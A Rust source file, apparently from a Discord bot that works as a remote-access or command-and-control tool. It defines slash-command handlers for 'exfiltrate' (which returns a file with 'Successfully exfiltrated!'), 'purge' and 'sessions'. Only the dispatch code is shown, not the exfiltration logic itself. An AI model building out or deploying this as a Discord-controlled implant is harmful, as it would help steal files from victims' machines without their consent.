use anyhow::Error;
use serenity::{
    client::Context,
    model::application::interaction::{InteractionResponseType, application_command::ApplicationCommandInteraction}
};
use crate::commands::sessions::session;
use crate::ephemeral_interaction_create;

pub mod exfiltrate;
pub mod info;
pub mod purge;
pub mod sessions;

pub async fn handle_exfiltrate(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), Error> {
    let attachment = exfiltrate::run(&command.data.options).await;

    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| {
                    if let Some(att) = attachment {
                        message.content("Successfully exfiltrated!");
                        message.add_file(att);
                    } else {
                        message.content("Failed to exfiltrate :(");
                    }

                    message
                })
        })
        .await?;
    Ok(())
}

pub async fn handle_purge(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), Error> {
    let content = purge::run(&ctx, &command.channel_id).await;
    ephemeral_interaction_create(ctx, command, &content).await?;
    Ok(())
}

pub async fn handle_session(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), Error> {
    let content = session::run(&ctx, &command.data.options).await?;
    ephemeral_interaction_create(ctx, command, &content).await?;
    Ok(())
}

